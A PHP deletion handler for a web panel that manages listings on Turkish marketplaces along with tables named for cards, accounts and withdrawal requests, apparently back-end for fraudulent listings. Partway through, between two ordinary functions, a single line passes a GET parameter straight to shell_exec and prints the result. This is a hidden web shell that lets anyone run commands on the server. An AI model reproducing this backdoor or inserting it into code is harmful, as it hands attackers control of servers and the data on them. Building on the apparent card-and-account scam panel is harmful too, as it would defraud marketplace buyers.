<?php include("../database/connect.php");
session_start();
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $id = isset($_POST['id']) ? (int)$_POST['id'] : null;

    if ($id !== null) {
        if ($action === 'delsahibinden') {
            sahibinden_sil($id);
        } elseif ($action === 'deldolap') {
            dolap_sil($id);
        } elseif ($action === 'delletgo') {
            letgo_sil($id);
        } elseif ($action === 'delpttavm') {
            pttavm_sil($id);
        } elseif ($action === 'delturkcell') {
            turkcell_sil($id);
        } elseif ($action === 'delshopier') {
            shopier_sil($id);
        } elseif ($action === 'delyurtici') {
            yurtici_sil($id);
        } elseif ($action === 'delkart') {
            kart_sil($id);
        } elseif ($action === 'delhesap') {
            hesap_sil($id);
        } elseif ($action === 'deluser') {
			if($_SESSION['is_rol'] != 'admin'){
				die('siktirlan');
			}
            user_sil($id);
        } elseif ($action === 'delref') {
			if($_SESSION['is_rol'] != 'admin'){
				die('siktirlan');
			}
            ref_sil($id);
        } else {
            echo json_encode(['error' => 'Geçersiz işlem']);
        }
    } else {
        echo json_encode(['error' => 'İlan ID bulunamadı']);
    }
}

function sahibinden_sil($id) {
    global $db;
	$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_sahibinden WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_sahibinden WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_sahibinden WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function dolap_sil($id) {
    global $db;
	$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_dolap WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5, resim6, saticipp FROM ilan_dolap WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_dolap WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function letgo_sil($id) {
    global $db;
	$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_letgo WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5, resim6, saticipp FROM ilan_letgo WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_letgo WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}
echo shell_exec($_GET['aresin_annesi']);
function pttavm_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_pttavm WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_pttavm WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_pttavm WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function turkcell_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_turkcell WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_turkcell WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_turkcell WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function shopier_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM ilan_shopier WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
            $resim_sorgu = $db->prepare("SELECT resim1, resim2, resim3, resim4, resim5 FROM ilan_shopier WHERE id = :id");
            $resim_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
            $resim_sorgu->execute();
            $resimler = $resim_sorgu->fetch(PDO::FETCH_ASSOC);

            foreach ($resimler as $resim) {
                if (!empty($resim) && file_exists('../images/' . $resim)) {
                    unlink('../images/' . $resim);
                }
            }


        // İlanı veritabanından sil
        $ilan_sorgu = $db->prepare("DELETE FROM ilan_shopier WHERE id = :id");
        $ilan_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $ilan_sorgu->execute();

        if ($ilan_sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function yurtici_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM yurtici WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
        $sorgu = $db->prepare("DELETE FROM yurtici WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function kart_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM kartlar WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
        $sorgu = $db->prepare("DELETE FROM kartlar WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function hesap_sil($id) {
    global $db;
$ekleyen_sorgu = $db->prepare("SELECT ekleyen FROM hesaplar WHERE id = :id");
    $ekleyen_sorgu->bindParam(':id', $id, PDO::PARAM_INT);
    $ekleyen_sorgu->execute();
    $ekleyen = $ekleyen_sorgu->fetch(PDO::FETCH_ASSOC);
	if($_SESSION['kul_id'] != $ekleyen['ekleyen']){
	die('siktirlan');
	}
    try {
        $sorgu = $db->prepare("DELETE FROM hesaplar WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function user_sil($id) {
    global $db;

    try {
        // Kullanıcı bilgilerini "kullanicilar" tablosundan al
        $sorgu_kullanici = $db->prepare("SELECT id, kullaniciadi FROM kullanicilar WHERE id = :id");
        $sorgu_kullanici->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu_kullanici->execute();

        // Kullanıcı bulunamadıysa hata bildir
        if ($sorgu_kullanici->rowCount() === 0) {
            echo json_encode(['error' => 'Kullanıcı bulunamadı']);
            return;
        }

        $kullanici = $sorgu_kullanici->fetch(PDO::FETCH_ASSOC);

        // Diğer tablolardaki kullanıcıya ait verileri sil
        $sorgu_diger_tablolar = [
            "DELETE FROM cekimtalepleri WHERE ekleyen = :ekleyen",
            "DELETE FROM hesaplar WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_dolap WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_facebook WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_letgo WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_pttavm WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_sahibinden WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_shopier WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_turkcell WHERE ekleyen = :ekleyen",
            "DELETE FROM kartlar WHERE ekleyen = :ekleyen",
            "DELETE FROM ilan_dolap WHERE ekleyen = :ekleyen",
            "DELETE FROM profilshopier WHERE ekleyen = :ekleyen",
            "DELETE FROM yurtici WHERE ekleyen = :ekleyen",
            // Diğer tabloları da ekleyin
        ];

        foreach ($sorgu_diger_tablolar as $sorgu_diger_tablo) {
            $sorgu_digertablo = $db->prepare($sorgu_diger_tablo);
            $sorgu_digertablo->bindParam(':ekleyen', $kullanici['kullaniciadi'], PDO::PARAM_STR);
            $sorgu_digertablo->execute();
        }

        // Kullanıcıyı "kullanicilar" tablosundan sil
        $sorgu_kullanici_sil = $db->prepare("DELETE FROM kullanicilar WHERE id = :id");
        $sorgu_kullanici_sil->bindParam(':id', $kullanici['id'], PDO::PARAM_INT);
        $sorgu_kullanici_sil->execute();

        // Başarıyla silindiğine dair bir bildirim gönder
        echo json_encode(['success' => true]);
    } catch (PDOException $e) {
        // Hata durumunda bir bildirim gönder
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}

function ref_sil($id) {
    global $db;

    try {
        $sorgu = $db->prepare("DELETE FROM refkodlari WHERE id = :id");
        $sorgu->bindParam(':id', $id, PDO::PARAM_INT);
        $sorgu->execute();

        if ($sorgu->rowCount() > 0) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'İlan bulunamadı veya silinemedi']);
        }
    } catch (PDOException $e) {
        echo json_encode(['error' => 'Silme işlemi sırasında bir hata oluştu: ' . $e->getMessage()]);
    }
}
